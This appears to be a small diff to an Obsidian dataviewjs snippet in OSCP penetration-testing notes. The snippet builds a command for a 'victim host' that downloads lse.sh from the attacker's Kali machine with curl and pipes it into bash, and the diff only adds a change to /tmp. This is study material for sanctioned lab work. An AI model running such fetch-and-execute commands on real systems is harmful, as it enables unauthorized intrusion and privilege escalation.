@@ -11,7 +11,7 @@ Directly execute into VICTIM HOST terminal
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `curl http://${KaliIP}:8888/lse.sh | bash`;
+const command = `cd /tmp && curl http://${KaliIP}:8888/lse.sh | bash`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
